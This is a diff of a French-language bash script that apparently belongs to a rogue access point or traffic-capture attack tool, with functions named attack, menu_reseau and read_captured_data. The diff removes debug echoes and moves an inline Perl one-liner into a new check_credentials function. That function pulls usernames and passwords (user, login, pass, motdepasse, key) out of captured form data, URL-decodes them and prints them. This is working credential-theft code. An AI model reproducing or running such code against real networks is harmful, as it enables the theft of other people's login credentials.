@@ -91,8 +91,7 @@ menu_reseau() {
         case $choix in
             [1-9])
                 if [[ $choix -le ${#interfaces[@]} ]]; then
-                    echo "TEST"
-                    sleep 2
+
                     modifier_dnsmasq_conf $choix
                     break
                 else
@@ -298,6 +297,15 @@ function attack {
 }
 
 
+check_credentials() {
+    perl -MURI::Escape -ne 'while (/(\b(?:username|login|user)=(.*?))&/g) { $user = uri_unescape($2) } while (/(\b(?:password|pass|motdepasse|key)=(.*?))&/g) { $pass = uri_unescape($2) } if ($user && $pass) { printf "Username: %s\nPassword: %s\n", $user, $pass }' "$1" > filtered_data_filtered.txt
+
+    
+    if [ ! -s filtered_data_filtered.txt ]; then
+        perl -MURI::Escape -ne 'if (/(\b(?:username|login|user)=(\S+))\b/) { $user = uri_unescape($2) } if (/(\b(?:password|pass|motdepasse|key)=((?:(?!&).)*))\b/) { $pass = uri_unescape($2) } if ($user && $pass) { printf "Username: %s\nPassword: %s\n", $user, $pass; exit; }' "$1" > filtered_data_filtered.txt
+    fi
+}
+
 function read_captured_data() {
     echo "Lecture du fichier capture.cap..."
 
@@ -344,8 +352,7 @@ fi
     gras="\e[1m"
     reset="\e[0m"
     echo ""
-    perl -MURI::Escape -ne 'while (/(\b(?:username|login|user)=(.*?))&/g) { $user = uri_unescape($2) } while (/(\b(?:password|pass|motdepasse|key)=(.*?))&/g) { $pass = uri_unescape($2) } if ($user && $pass) { printf "Username: %s\nPassword: %s\n", $user, $pass }' filtered_data.txt > filtered_data_filtered.txt
-
+    check_credentials "filtered_data.txt"
     
 
     
@@ -465,6 +472,6 @@ while true; do
             exit 0
             ;;
         esac
-        echo "Test"
+        
         
 done
